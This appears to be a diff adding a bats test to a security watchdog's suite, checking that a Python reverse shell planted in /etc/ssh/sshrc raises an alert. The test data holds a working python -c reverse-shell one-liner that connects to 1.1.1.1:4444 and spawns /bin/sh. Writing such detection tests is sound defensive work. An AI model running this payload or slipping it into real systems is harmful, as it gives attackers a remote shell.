@@ -250,3 +250,18 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant: socket.socket(AF_INET...)+ os.dup2 — interpreter-rev-shell axis)" {
+    # Sister to many other watchdog's interpreter-rev-shell INVARIANT
+    # across the brain. Beyond bash/sh/nc, attackers reach for
+    # python -c 'import socket,os...' to dodge shell-pattern
+    # detectors. Lock the python interpreter axis on the
+    # per-SSH-login exec surface (T1546 — /etc/ssh/sshrc executes
+    # AS THE LOGGING-IN USER on every SSH session).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# sshrc\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${SSHRC}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
